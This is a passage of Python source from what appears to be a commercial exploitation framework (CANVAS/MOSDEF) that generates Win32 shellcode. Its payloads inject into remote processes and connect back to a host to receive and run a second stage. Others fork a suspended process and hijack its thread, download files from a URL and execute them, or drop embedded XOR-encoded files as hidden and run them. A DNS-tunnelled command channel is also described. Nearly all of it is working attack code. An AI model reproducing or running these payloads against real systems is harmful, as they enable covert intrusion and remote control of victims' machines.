            pushl %edi
            call *WRITEPROCESSMEMORY-getpcloc(%ebp)

            // start the remote thread
            xorl  %eax, %eax
            pushl %eax
            pushl %eax
            pushl %eax
            pushl %esi
            pushl %eax
            pushl %eax
            pushl %edi
            call *CREATEREMOTETHREAD-getpcloc(%ebp)
            // WAITCODE

        """

        if exit_thread:
            codegen.main += """
            // exit this thread .. handle leaks be damned
            pushl %eax
            call *EXITTHREAD-getpcloc(%ebp)
        """

        codegen.main += """
callback_mode:
            // this is where the code we want to inject goes
            //int3

            //call socket(2, 1, 6)
            pushl $6
            pushl $1
            pushl $2
            cld
            call *SOCKET-getpcloc(%ebp)
            movl %eax,%esi //save this off
            movl %eax, *FDSPOT-getpcloc(%ebp)
            leal 4(%esp),%edi
            movl $PORT,4(%esp)
            movl $IPADDRESS,8(%esp)
            push $0x10
            pushl %edi
            pushl %eax
            call *CONNECT-getpcloc(%ebp)

        """

        if universal:
            if (self.module
                and hasattr(self.module, 'engine') == True
                and self.module.engine):

                mosdef_type = self.module.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
                mosdef_id = self.module.engine.getNewMosdefID(self.module)

            else:
                mosdef_type = 0
                mosdef_id = 0

            logging.info('Using Win32 Universal, type: %d, id: %d' % (mosdef_type, mosdef_id))

            codegen.main += """
send_universal:
                pushl $MOSDEF_TYPE
                movl %esp, %esi
                movl $4, %edi
sendloop_one:
                pushl $0
                pushl %edi
                pushl %esi
                pushl FDSPOT-getpcloc(%ebp)
                call *SEND-getpcloc(%ebp)
                test  %eax, %eax
                jl    exit
                sub %eax, %edi
                add %eax, %esi
                test %edi, %edi
                jne sendloop_one
                popl %eax

                pushl $MOSDEF_ID
                movl %esp, %esi
                movl $4, %edi
sendloop_two:
                pushl $0
                pushl %edi
                pushl %esi
                pushl FDSPOT-getpcloc(%ebp)
                call *SEND-getpcloc(%ebp)
                test  %eax, %eax
                jl    exit
                sub %eax, %edi
                add %eax, %esi
                test %edi, %edi
                jne sendloop_two
                popl %eax
            """

            codegen.main = codegen.main.replace('MOSDEF_TYPE', str(reverseword(mosdef_type)))
            codegen.main = codegen.main.replace('MOSDEF_ID', str(reverseword(mosdef_id)))

        codegen.main+= """

recvexecloop:
            movl *FDSPOT-getpcloc(%ebp), %esi
            leal codeend-getpcloc(%ebp),%edi
            pushl $0
            push $4
            pushl %edi
            pushl %esi
            call *RECV-getpcloc(%ebp)
            //int3
            movl (%edi),%eax
            //subl %eax,%esp
            //andl $-4,%esp
            //movl %esp,%edi

            pushl $0
            pushl %eax
            pushl %edi
            pushl %esi
            call *RECV-getpcloc(%ebp)
stagetwo:
            jmp *%edi
            //int3
            //subl $0x1000,%esp
            //jmp *%edi

        """

        waitcode_snip = """
        pushl %eax

        pushl $-1
        pushl %eax
        call WAITFORSINGLEOBJECT-getpcloc(%ebp)

        // closehandle() on thread handle and process handle, handle is already pushed

        // eax already pushed
        call CLOSEHANDLE-getpcloc(%ebp)
        pushl %edi
        call CLOSEHANDLE-getpcloc(%ebp)
        ret
        """
        logging.info("Generating inject into pid: %d" % pid)
        codegen.main = codegen.main.replace('PID', '0x%.4x' % pid)
        codegen.main = codegen.main.replace('PROCESSLEN', '0x%.8x' % (len(target)*2) )
        codegen.main = codegen.main.replace('IPADDRESS', \
                           uint32fmt(istr2int(socket.inet_aton(host))))
        codegen.main = codegen.main.replace('PORT', \
                           uint32fmt(reverseword((0x02000000 | port))))
        if waitcode:
            logging.info("Inserting wait code")
            codegen.main = codegen.main.replace("WAITCODE", waitcode_snip)
        else:
            logging.info("Inserting return instead of wait code")
            codegen.main = codegen.main.replace("WAITCODE", "WAITCODE:\nret")

        asm = codegen.get()
        sc = mosdef.assemble(asm, 'X86')
        codesize = len(sc)
        codegen.main = codegen.main.replace('0xdeadbabe', '0x%.8x' % (len(sc) + 0x1000)) # Size to VirtualAllocEx
        codegen.main = codegen.main.replace('0xdeadbeef', '0x%.8x' % (len(sc) ))         # Size to WriteProcess
        f = open("1.txt", "w").write( codegen.main )
        # return final size filled payload
        return codegen.get()

    def forkload(self, host, port, processname = "dmremote", restorehash = True, load_winsock = False):
        """
          forkload forks a process and remotely creates a thread and injects itself.

          dmremote is used because it does not have a window, yet is a GUI process.

          After different approach to the same problem, the best option that came out was to createremotethread
          to a VirtualAllocEx memory that we inject ourselves, because if we modify the main server
          the dll were not initialized yet and so it crash on Critical Section usage and stuff like that.
          To avoid these, as I said before, we create a new thread and inject ourselve and do a kernel32.Sleep
          of one second so we give the newly create process to initialize itself.
          If the option is given, it automatically loadlibrary ws2_32.dll

          Note: Another interesting trick which was need was "restorehash", which basically holds
          a copy of all the function hash and so when injected it restore them, since the default
          behaviour of our resolver was to replace hashes with resolved address. We could have just
          leave it like that, but it wouldn't work on ASLR environment.

          dave - Is ASLR per boot? I assume the other main reason this wouldn't work is
          when things get rebased (which happens in lsass.exe a lot, for example).


        """
        codegen = self.get_basecode( restorehash = restorehash )
        # get the imports we need
        codegen.call_function('kernel32.dll!sleep', [1000] )
        if load_winsock:
            codegen.load_library('ws2_32.dll')
            codegen.find_function('kernel32.dll!loadlibrarya')
        codegen.find_function('kernel32.dll!sleep')

        codegen.find_function("kernel32.dll!getthreadcontext")
        codegen.find_function("kernel32.dll!resumethread")
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!virtualallocex")
        codegen.find_function("kernel32.dll!writeprocessmemory")
        codegen.find_function('kernel32.dll!createremotethread')
        codegen.find_function("kernel32.dll!exitthread")
        if load_winsock == True:
            codegen.find_function('ws2_32.dll!wsastartup')
        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!recv')



        codegen.main += ""

        """
        LSD style semi-fork() for win32

        NOTES:
          o this is mildy self modifying to get a bit of a UNIX style fork() feel
            basically we clear a marker that tells the opcode wether it's a parent
            or child thread on runtime. So when the payload is copied over we can
            decide if it's a "parent" or "child", where children jump to execute
            "forkthis:"

        """
        codegen.main += """
forkentry:
        // if this marker is cleared this jmps to forkthis:
        // we copy this entire payload over ;)
        xorl %eax, %eax
        incl %eax
        test %eax,%eax
        jz forkthis

        // start of self modifying muck

        // Self modifying code, change the incl for a nop
        leal forkentry-getpcloc(%ebp),%ecx
        movb $0x90, 2(%ecx)

        leal startsploit-getpcloc(%ebp),%ecx

        // patch out mov ebx,esp, either way we want to keep esp as is on the "child"

        // end of self modifying muck

        // STARTUPINFO
        subl $68,%esp
        movl %esp,%ecx
        movl $68,(%ecx)
        movl $1,44(%ecx)
        // PROCESS_INFORMATION
        subl $16,%esp
        movl %esp,%edx
        // CONTEXT
        subl $716,%esp
        movl %esp,%edi

        // save vars for later use
        pushl %edi   // CONTEXT
        //pushl %ecx   // STARTUPINFO
        //pushl %edx   // PROCESS INFORMATION


        pushl %ecx
        // zero out vars before use
        // 800 bytes total
        decl %eax // eax was 1
        movl $800, %ecx
        rep stosb

        // restore %ecx
        popl  %ecx

        PROCESSINJECT

        movl %esp,%esi

        // &PROCESS_INFORMATION
        pushl %edx
        // &STARTUPINFO = {0}
        // movl %eax,(%ecx) // we dont need this one, we already zero it out
        pushl %ecx
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // CREATE_SUSPEND
        pushl $0x4
        // 0
        pushl %eax
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // "cmd"
        pushl %esi
        movl %edx, %esi // process information saved on esi
        // NULL
        pushl %eax
        call CREATEPROCESSA-getpcloc(%ebp)

        // CLEANING THE STRING PUSHING
        PROCESSCLEAN


        pushl 4(%esi)      // push pi.Thread
        movl (%esi), %esi  // esi now holds the Handle
        leal shellcodestart-getpcloc(%ebp),%edx
        leal endmark-getpcloc(%ebp),%ecx
        subl %edx,%ecx

        pushl %edx // shellcodestart
        pushl %ecx // size

        // virtual alloc in remote process
        xorl %eax,%eax
        movb $0x40,%al
        pushl %eax
        movw $0x1000,%ax
        pushl %eax                   // AllocType
        // codesize
        addl %eax,%ecx
        pushl %ecx                  // dwSize
        xorl %eax,%eax
        pushl %eax                   // lpAddress
        pushl %esi                   // hProcess
        call *VIRTUALALLOCEX-getpcloc(%ebp)
        movl %eax, %edi

        pop %ecx // size
        pop %edx // shellcodestart


        // write process memory our entire payload
        xorl %eax,%eax
        pushl %eax
        // codesize
        pushl %ecx
        // code start is at ebp-11
        //movl %ebp,%eax
        //subl $11,%ax
        pushl %edx   // shellcode start
        pushl %edi   // valloc addr
        pushl %esi   // hProcess
        call *WRITEPROCESSMEMORY-getpcloc(%ebp)

        popl  %ebx // get pi.Thread
        popl  %eax // get context info
        //movl  %eax,%edi // edi is now context info
        pushl %esi        // save hProcess
        movl  %ebx, %esi // esi is pi.Thread

        // ctx.ContextFlag=Context_FULL
        movl $0x10007, (%eax)
        // &ctx
        pushl %eax
        // pi.hThread
        pushl %esi
        call GETTHREADCONTEXT-getpcloc(%ebp)

        popl %ebx // restore hProcess

        // start the remote thread
        xorl  %eax, %eax
        pushl %eax
        pushl %eax   // CREATE and Run the thread
        pushl %eax
        pushl %edi   // Shellcode address
        pushl %eax
        pushl %eax
        pushl %ebx   // hProcess
        call *CREATEREMOTETHREAD-getpcloc(%ebp)

        // pi.hThread
        pushl %esi
        call RESUMETHREAD-getpcloc(%ebp)

postfork:

        // reset stack and ret?
        // we should really save state before findeip muck
        // and restore (popa?) at this point to ret or whatever
        // dave - hmm. Shouldn't we instead jmp exit? or even a jmp forkparent:
        addl $804,%esp

        xorl %eax,%eax
        pushl %eax
        call EXITTHREAD-getpcloc(%ebp)

forkthis:
           subl $0x200,%esp
           pushl %esp
           xorl %ebx,%ebx
           movb $0x1,%bh
           movb $0x1,%bl
           pushl %ebx
           call *WSASTARTUP-getpcloc(%ebp)
           addl $0x200,%esp // mosdef still has that issue with 0x100/256 sized addl's!

            // to fork code is tacked on here
            // to fork code is tacked on here
            pushl $6
            pushl $1
            pushl $2
            cld
            call *SOCKET-getpcloc(%ebp)
            movl %eax,%esi //save our socket handle off into ESI
            leal 4(%esp),%edi
            movl $PORT,4(%esp)
            movl $IPADDRESS,8(%esp)
            push $0x10
            pushl %edi
            pushl %eax
            call *CONNECT-getpcloc(%ebp)
            // No error checking here unfortunately!

            leal codeend-getpcloc(%ebp),%edi
gogetlen:

            pushl $0
            push $4
            pushl %edi
            pushl %esi
            call *RECV-getpcloc(%ebp)
            //int3
            movl (%edi),%eax
            //subl %eax,%esp
            //andl $-4,%esp
            //movl %esp,%edi

            pushl $0
            pushl %eax
            pushl %edi
            pushl %esi
            call *RECV-getpcloc(%ebp)
stagetwo:
            jmp *%edi
endmark:
        """


        codegen.main = codegen.main.replace('IPADDRESS', \
                                            uint32fmt(istr2int(socket.inet_aton(host))))
        codegen.main = codegen.main.replace('PORT', \
                                            uint32fmt(reverseword((0x02000000 | port))))

        outcode = ""
        idx = 0
        if (len( processname ) % 4) == 0:
            outcode += "push %eax\n"
            idx += 1
        ret = s_to_push(processname, "<")
        idx += len(ret)
        outcode += "".join( [ "push $0x%08x\n"% x  for x in ret ] )
        codegen.main = codegen.main.replace("PROCESSINJECT", outcode)
        codegen.main = codegen.main.replace("PROCESSCLEAN", "popl %eax\n" * idx)


        #if args == None:
        #codegen.main = codegen.main.replace("ESPPATCH", patch)
        # else we patch


        return codegen.get()

    def httpcachedownload(self, urlfile, isBatch = False, usedll = 0):
        """
        Http Cache Download
          This shellcode will automatically download a file into the IE cache and execute it.
          Depending on what you program you are executing, you might need to append "cmd /c" at the begging,
          to do that just enable isBatch
          Note: Right now this doesn't work with CANVAS httpuploader due to incompatibilities issue.
dave - like what? Let's fix those.
        """

        codegen = self.get_basecode()
        codegen.find_function("kernel32.dll!loadlibrarya")
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!exitthread")
        codegen.load_library('urlmon.dll')
        codegen.find_function("urlmon.dll!urldownloadtocachefilea")
        codegen._globals.addString("URLNAME", urlfile)

        codegen.main = """
        xorl %eax, %eax
        mov $0x208, %edx
        //movl %ecx, %edx
        sub %edx, %esp
        movl  %esp, %esi

        leal URLNAME-getpcloc(%ebp),%edi     // EDI holds the url name

        pushl %esi   //we pop this back into esi at some point
        // BATCHCODE
        // ------

        pushl %eax                           // pBSC
        pushl %eax                           // dwReserved
        pushl %edx                           // dwBufLength
        pushl %esi                           // szFileName
        pushl %edi                           // URL
        pushl %eax                           // lpUnkCaller
        call URLDOWNLOADTOCACHEFILEA-getpcloc(%ebp) // HFILE handle
        //we do not check for error here! (for size reasons)
        """

        if usedll == 1:
            codegen.main += """
            //filename pointer is at top of thestack
            call LOADLIBRARYA-getpcloc(%ebp)
            """
        else:
            codegen.main += """
            pop %esi  // get the file back
            //esi points to the filename now

            xorl %eax, %eax
            movl  $0x100, %ecx
            subl  %ecx, %esp
            movl %esp, %edi // CLEAR the buffer
            rep stosb

            leal 16(%esp), %ecx
            leal 84(%esp), %edx
            mov $0x1, 0x2c(%edx)

            pushl %ecx   // PROCESS INFORMATION
            pushl %edx   // STARTUP INFO
            pushl %eax
            pushl %eax
            pushl %eax    // Creation Flag
            pushl %eax
            pushl %eax
            pushl %eax
            pushl %eax  //command line (null - we have spaces and no need to quote if we use file name instaed)
            pushl %esi  // (file name - will have spaces in it)
            call CREATEPROCESSA-getpcloc(%ebp)
            """
        codegen.main += """
        xorl %eax,%eax
        pushl %eax
        call EXITTHREAD-getpcloc(%ebp)
        """

        batchcode= """
        movl  $0x20646D63, (%esi)
        movl  $0x22204b2F, 4(%esi) // "cmd /c"
        sub   $-8, %edx
        add   $8, %esi  // esi pointing after the "cmd /c"
        """
        if isBatch:
            codegen.main = codegen.main.replace("BATCHCODE", batchcode)

        return codegen.get()

    def httpcachedownloadloop(self, urlfile, isBatch = False, sleep=30):
        """
        Http Cache Download + Loop if it doesn't work
          This shellcode will automatically download a file into the IE cache and execute it.
          Depending on what you program you are executing, you might need to append "cmd /c" at the begging,
          to do that just enable isBatch
          It exitprocess after the createprocess.
          In case the download fails, we sleep and retry indefinitely.
        """

        codegen = self.get_basecode()
        codegen.find_function("kernel32.dll!loadlibrarya")
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!exitprocess")
        codegen.find_function("kernel32.dll!sleep")
        codegen.load_library('urlmon.dll')
        codegen.find_function("urlmon.dll!urldownloadtocachefilea")
        codegen._globals.addString("URLNAME", urlfile)

        codegen.main = """
        loop_here:
        xorl %eax, %eax
        mov $0x208, %edx
        sub %edx, %esp
        movl  %esp, %esi

        leal URLNAME-getpcloc(%ebp),%edi     // EDI holds the url name

        pushl %esi   //we pop this back into esi at some point
        // BATCHCODE
        // ------

        pushl %eax                           // pBSC
        pushl %eax                           // dwReserved
        pushl %edx                           // dwBufLength
        pushl %esi                           // szFileName
        pushl %edi                           // URL
        pushl %eax                           // lpUnkCaller
        call URLDOWNLOADTOCACHEFILEA-getpcloc(%ebp) // HFILE handle
        cmpl $0, %eax
        jnz sleep

        pop %esi  // get the file back
        //esi points to the filename now

        xorl %eax, %eax
        movl  $0x100, %ecx
        subl  %ecx, %esp
        movl %esp, %edi // CLEAR the buffer
        rep stosb

        leal 16(%esp), %ecx
        leal 84(%esp), %edx
        mov $0x1, 0x2c(%edx)

        pushl %ecx   // PROCESS INFORMATION
        pushl %edx   // STARTUP INFO
        pushl %eax
        pushl %eax
        pushl %eax    // Creation Flag
        pushl %eax
        pushl %eax
        pushl %eax
        pushl %eax  //command line (null - we have spaces and no need to quote if we use file name instaed)
        pushl %esi  // (file name - will have spaces in it)
        call CREATEPROCESSA-getpcloc(%ebp)
        xorl %eax,%eax
        pushl %eax
        call EXITPROCESS-getpcloc(%ebp)

        sleep:
        pushl $SLEEPTIME
        call SLEEP-getpcloc(%ebp)

        //clean stack
        addl $0x20C, %esp
        jmp loop_here
        """

        batchcode= """
        movl  $0x20646D63, (%esi)
        movl  $0x22204b2F, 4(%esi) // "cmd /c"
        sub   $-8, %edx
        add   $8, %esi  // esi pointing after the "cmd /c"
        """
        if isBatch:
            codegen.main = codegen.main.replace("BATCHCODE", batchcode)

        codegen.main = codegen.main.replace("SLEEPTIME", str(sleep*1000))

        return codegen.get()

    def httpdownload(self, urlfile, filename = ""):
        codegen = self.get_basecode()

        codegen.find_function("kernel32.dll!loadlibrarya")
        codegen.find_function("kernel32.dll!createfilea")
        codegen.find_function("kernel32.dll!writefile")
        codegen.find_function("kernel32.dll!closehandle")
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!exitprocess")
        codegen.load_library('wininet.dll')
        codegen.find_function("wininet.dll!internetopena")
        codegen.find_function("wininet.dll!internetopenurla")
        codegen.find_function("wininet.dll!internetreadfile")

        codegen._globals.addString("URLNAME", urlfile)

        codegen.main = """
httpdownload:
        xorl %esi, %esi
        pushl %esi
        pushl %esi
        pushl %esi
        pushl %esi
        pushl %esi
        call INTERNETOPENA-getpcloc(%ebp) // creating a HINTERNET object
        movl %eax, %edi

        pushl %esi
        pushl %esi
        pushl %esi
        pushl %esi
        leal URLNAME-getpcloc(%ebp),%esi     // ESI holds the url name
        pushl %esi
        pushl %edi                           // HINTERNET
        call INTERNETOPENURLA-getpcloc(%ebp) // HFILE handle
        pushl %edi       // saving HINTERNET
        //pushl %eax       // saving HFILE
        movl %eax, %edi  // HFILE is now on edi

        xorl %eax, %eax
        pushl %eax
        // FILE_ATTRIBUTE_NORMAL 0x80
        // FILE_ATTRIBUTE_HIDDEN  0x2
        movb $0x82, %al
        push %eax
        movb $0x2, %al
        push %eax
        xor %eax, %eax
        push %eax      // lpSecurityAttributes NULL
        push %eax      // dwShareMode 0x0
        inc  %eax
        ror  $4, %eax
        push %eax      // GENERIC_ALL 0x10000000
        leal OFFSETTOFILE(%esi), %eax        // URLNAME + OFFSET to get the file (http://www/file.exe
        push %eax
        call CREATEFILEA-getpcloc(%ebp)
        //pushl %eax // save Filed
        //movl %eax, %edi     // file descriptor

        mov  $0x208, %ebx
        subl %ebx, %esp
        movl %esp, %esi
        pushl %eax  // SAVE hfile

downloadloop:
        leal  4(%esi), %ebx
        pushl %ebx       // written bytes
        pushl $0x200   // bytes to read
        leal  8(%esi), %ebx
        pushl %ebx
        pushl %edi     // hFile
        call INTERNETREADFILE-getpcloc(%ebp)

        movl  4(%esi), %ebx
        test  %ebx, %ebx
        jz finishdownload // Check if internetread read 0 bytes

        popl  %ebx  // get the filedescriptor
        pushl %ebx  // save it back

        xorl %eax, %eax
        pushl  %eax  //    NULL
        leal  4(%esi), %ecx
        pushl %ecx       // written bytes
        pushl $0x200     // bytes to write
        leal 8(%esi), %ecx
        pushl %ecx           // buffer
        pushl %ebx       // filefd
        call WRITEFILE-getpcloc(%ebp)
        jmp downloadloop
finishdownload:
        // since filefd is already pushed, i can directly call close handle
        call CLOSEHANDLE-getpcloc(%ebp)
        //mov  %ebx, 0x208
        //addl %ebx, %esp
        xorl %ecx, %ecx
        xorl %eax, %eax
        movl  $0x208, %ecx
        movl %esp, %edi // CLEAR the buffer
        rep stosb

        leal 16(%esp), %ecx
        leal 84(%esp), %edx
        pushl %ecx   // PROCESS INFORMATION
        pushl %edx   // STARTUP INFO
        pushl %eax
        pushl %eax
        pushl %eax    // Creation Flag
        pushl %eax
        pushl %eax
        pushl %eax
        leal URLNAME-getpcloc(%ebp),%ecx
        leal OFFSETTOFILE(%ecx), %ecx        // URLNAME + OFFSET to get the file (http://www/file.exe
        pushl %ecx  // command
        pushl %eax
        call CREATEPROCESSA-getpcloc(%ebp)
        call EXITPROCESS-getpcloc(%ebp)
        """

        codegen.main = codegen.main.replace('OFFSETTOFILE', \
                                            uint32fmt( urlfile.rfind("/") + 1 ))

        return codegen.get()

    def attachandexecute(self, filename = "", remotefilename="t.exe", args = None, xorencode = False, ):
        codegen = self.get_basecode()
        import urllib

        codegen.find_function("kernel32.dll!createfilea")
        codegen.find_function("kernel32.dll!writefile")
        codegen.find_function("kernel32.dll!closehandle")
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!exitprocess")
        if args:
            codegen._globals.addString("FILEARGS", "%s %s" % (remotefilename, args))

        codegen._globals.addString("FILENAME", remotefilename)

        codegen.main = """
attachandexecute:
        leal FILENAME-getpcloc(%ebp),%esi     // ESI holds the url name

        xorl %eax, %eax
        pushl %eax
        // FILE_ATTRIBUTE_NORMAL 0x80
        // FILE_ATTRIBUTE_HIDDEN  0x2
        movb $0x82, %al
        push %eax
        movb $0x2, %al
        push %eax
        xor %eax, %eax
        push %eax      // lpSecurityAttributes NULL
        push %eax      // dwShareMode 0x0
        inc  %eax
        ror  $4, %eax
        push %eax      // GENERIC_ALL 0x10000000
        push %esi
        call CREATEFILEA-getpcloc(%ebp)
        pushl %eax
        //movl %eax, %edi     // file descriptor

        leal filestart-getpcloc(%ebp), %edx
        // XORCODE

        xorl %ebx, %ebx
        pushl  %ebx  //    NULL
        leal  8(%esp), %ecx
        pushl %ecx       // written bytes
        pushl $FILELEN     // bytes to write
        //leal filestart-getpcloc(%ebp),%ecx
        pushl %edx           // buffer
        pushl %eax           // filefd
        call WRITEFILE-getpcloc(%ebp)

finishdownload:
        // since filefd is already pushed, i can directly call close handle
        call CLOSEHANDLE-getpcloc(%ebp)
        //mov  %ebx, 0x208
        //addl %ebx, %esp
        xorl %ecx, %ecx
        xorl %eax, %eax
        movl  $0x208, %ecx
        subl  %ecx, %esp
        movl %esp, %edi // CLEAR the buffer
        rep stosb

        leal 16(%esp), %ecx
        leal 84(%esp), %edx

        // ARGUMENTS

        pushl %ecx   // PROCESS INFORMATION
        pushl %edx   // STARTUP INFO
        pushl %eax
        pushl %eax
        pushl %eax    // Creation Flag
        pushl %eax
        pushl %eax
        pushl %eax
        pushl %esi  // command
        pushl %eax
        call CREATEPROCESSA-getpcloc(%ebp)
        call EXITPROCESS-getpcloc(%ebp)
filestart:
        .urlencoded "FILEBUFFER"
        """
        f= open( filename, "rb")
        buf = f.read()
        f.close()

        if xorencode:
            import random
            key = random.randint(1, 255)
            xorcode = """
            movl  $FILELEN, %%ecx
            movl  %%edx, %%ebx        // save value
        xorfile:
            xorb $%d, (%%ebx)
            incl %%ebx
            loop xorfile
            """ % key
            codegen.main = codegen.main.replace('XORCODE', xorcode)
            buf = "".join( [ chr(ord(x) ^ key) for x in buf] )

        codegen.main = codegen.main.replace('FILELEN', \
                                            uint32fmt( len(buf) ))
        codegen.main = codegen.main.replace('FILEBUFFER', \
                                            urllib.quote(buf))
        if args:
            code = """
            leal FILEARGS-getpcloc(%ebp),%esi
            """
            codegen.main = codegen.main.replace('ARGUMENTS', code )


        return codegen.get()


    def __forkload(self, restorehash = False):

        codegen = self.get_basecode(restorehash = restorehash)
        # get the imports we need
        codegen.find_function('kernel32.dll!sleep')
        codegen.call_function('kernel32.dll!sleep', [5000] )
        codegen.find_function('kernel32.dll!loadlibrarya')

        codegen.load_library('ws2_32.dll')
        #codegen.find_function('ws2_32.dll!wsastartup')

        codegen.find_function("kernel32.dll!getthreadcontext")
        codegen.find_function("kernel32.dll!resumethread")
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!virtualallocex")
        codegen.find_function("kernel32.dll!writeprocessmemory")
        codegen.find_function("kernel32.dll!setthreadcontext")
        codegen.find_function("kernel32.dll!exitthread")

        codegen.main += ""

        """
        LSD style semi-fork() for win32

        NOTES:
          o this is mildy self modifying to get a bit of a UNIX style fork() feel
            basically we clear a marker that tells the opcode wether it's a parent
            or child thread on runtime. So when the payload is copied over we can
            decide if it's a "parent" or "child", where children jump to execute
            "forkthis:"

        """
        codegen.main += """
forkentry:
        // if this marker is cleared this jmps to forkthis:
        // we copy this entire payload over ;)
        xorl %eax, %eax
        incl %eax
        test %eax,%eax
        jz forkthis

        // start of self modifying muck

        // Self modifying code, change the incl for a nop
        leal forkentry-getpcloc(%ebp),%ecx
        movb $0x90, 2(%ecx)

        leal startsploit-getpcloc(%ebp),%ecx

        // patch out mov ebx,esp, either way we want to keep esp as is on the "child"

        // end of self modifying muck

        // STARTUPINFO
        subl $68,%esp
        movl %esp,%ecx
        // PROCESS_INFORMATION
        subl $16,%esp
        movl %esp,%edx
        // CONTEXT
        subl $716,%esp
        movl %esp,%edi

        // save vars for later use
        pushl %edx   // PROCESS INFORMATION
        pushl %edi   // CONTEXT
        pushl %ecx   // STARTUPINFO

        // zero out vars before use
        // 800 bytes total
        decl %eax // eax was 1
        movl $800, %ecx
        rep stosb

        // restore %ecx
        popl  %ecx
        pushl %ecx

        // "Explorer" string
        pushl %eax
        pushl $0x7265726f
        pushl $0x6c707845
        //pushl $0x00646170
        //pushl $0x65746f6e

        movl %esp,%esi

        // &PROCESS_INFORMATION
        pushl %edx
        // &STARTUPINFO = {0}
        // movl %eax,(%ecx) // we dont need this one, we already zero it out
        pushl %ecx
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // CREATE_SUSPENDED
        pushl $4
        // 0
        pushl %eax
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // "cmd"
        pushl %esi
        // NULL
        pushl %eax
        call CREATEPROCESSA-getpcloc(%ebp)


        // reset string space
        popl %eax
        popl %eax
        popl %eax

        // restore pointers Context and ProcessInformation
        //movl (%esp),%edi
        //movl 4(%esp),%edx

        popl %ecx
        popl %edi
        popl %edx

        pushl %edx   // PROCESS INFORMATION
        pushl %edi   // CONTEXT
        pushl %ecx   // STARTUPINFO

        movl %edx, %esi // esi now also have the PROCESS INFORMATION

        // ctx.ContextFlag=Context_FULL
        movl $0x10007, (%edi)
        // &ctx
        pushl %edi
        // pi.hThread
        pushl 4(%edx)
        call GETTHREADCONTEXT-getpcloc(%ebp)

        // restore pointers
        //movl 8(%esp),%edx

        // PAGE_EXECUTE_READWRITE
        pushl $0x40
        // MEM_COMMIT
        pushl $0x1000
        // size
        pushl $0x5000
        // NULL
        xorl %eax,%eax
        pushl %eax
        // pi.hProcess
        pushl (%esi) // PROCESS INFORMATION
        call VIRTUALALLOCEX-getpcloc(%ebp)

        // restore pointers
        //movl 4(%esp),%edx

        // address is in %eax
        pushl %eax

        // NULL
        xorl %ecx,%ecx
        pushl %ecx
        // opcode len !!!
        leal shellcodestart-getpcloc(%ebp),%edx
        leal endmark-getpcloc(%ebp),%ecx
        subl %edx,%ecx
        //addl $300, %ecx //not needed.
        pushl %ecx
        // source buf
        pushl %edx
        // target addy
        pushl %eax
        // pi.hProcess
        pushl (%esi)
        call WRITEPROCESSMEMORY-getpcloc(%ebp)

        popl %eax

        // restore pointers
        popl  %ecx
        popl  %edi
        //pushl %edi
        //pushl %ecx


        // ctx.ContextFlags = CONTEXT_FULL
        movl $0x10007,(%edi)
        // ctx.Eip = targetaddy
        movl %eax,184(%edi)
        // &ctx
        pushl %edi
        // pi.hThread
        pushl 4(%esi)
        call SETTHREADCONTEXT-getpcloc(%ebp)

        // restore pointers
        //movl 4(%esp),%edx

        // pi.hThread
        pushl 4(%esi)
        call RESUMETHREAD-getpcloc(%ebp)

postfork:
        // reset stack and ret?
        // we should really save state before findeip muck
        // and restore (popa?) at this point to ret or whatever
        // dave - hmm. Shouldn't we instead jmp exit? or even a jmp forkparent:
        addl $804,%esp

        //xorl %eax,%eax
        //pushl %eax
        pushl $0
        call EXITTHREAD-getpcloc(%ebp)

forkthis:
         int3
endmark:
        """


        #if args == None:
        #codegen.main = codegen.main.replace("ESPPATCH", patch)
        # else we patch


        return codegen.get()


    # This is a WIP, even the protocol is not yet stable
    #
    # How it works:
    # very similar to http_proxy
    # First starts a new thread with a receive & execute wich binds to localhost
    # Then from the main thread is connects to it and starts the main flow:
    #
    #    - select on mosdef socket
    #        -> push data over DNS
    #
    #    - DNS pop (like a select)
    #        -> send data to mosdef
    #
    #    - loop
    #
    # We need to solve two issues, first when our proxied mosdef wants to send
    # data over the wire, and the other when our canvas wants to send data to
    # mosdef.
    #
    # The first one is solved making what we call a DNS push, so the data sent
    # from mosdef to canvas will go in the form of a DNS request,
    #    example PUSH request:
    #    TXT for ABCXXXXXXXXXXXXX[....]XXXX.immunityinc.com
    #    TODO: define flags, etc
    #
    # The other way communication is solved making a constant poll over dns,
    # sending pop messages constantly.
    # Each POP request _must_ be answered by the dns server, even if it has
    # nothing to send, but is useful as a kind of keep alive.
    #    example POP request:
    #    TXT for ABC.immunityinc.com
    #    TODO: define flags, etc
    #
    #
    # Responses came in the form of TXT DNS replies, where the txt field is
    # base64 encoded, and the first byte represents flags
    #    Response message format:
    #
    #    Type: TXT
    #    Name: root
    #    data: XXXXXXXXXXXXXXXXXX  (base 64 encoded data)
    #
    #    Unencoded data is of the form:
    #         FHHHHHHHHHHHHHHHHHHHHH
    #    Where F is 1byte flags, and HH... is the actual payload
    #
    #    Flags:
    #          [1][2][3][4][5][6][7][8]
    #
    #           1 - Has Data: when set we expect some data after the flags, if not
    #               set is just a keep alive response.
    #           2 - more fragments: when set we are expecting more fragments comming
    #               after the actual, and must be reassembled
    #           3-8 Unused
    #
    #

    def dns_proxy(self, domain, dnsaddr, s_count=20, s_size=16, sleeplen=500, load_winsock=True):
        """ a udp DNS to tcp MOSDEF proxy payload """
        codegen = self.get_basecode()
        if self.vista_compat:
            codegen.vista_compat=True

        #test
        #codegen.load_library('user32.dll')
        #codegen.find_function('user32.dll!MessageBoxA')

        # ws2_32.dll
        codegen.find_function('kernel32.dll!loadlibrarya')
        if load_winsock == True:
            codegen.load_library('ws2_32.dll')
            codegen.find_function('ws2_32.dll!wsastartup')

        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!bind')
        codegen.find_function('ws2_32.dll!listen')
        codegen.find_function('ws2_32.dll!accept')
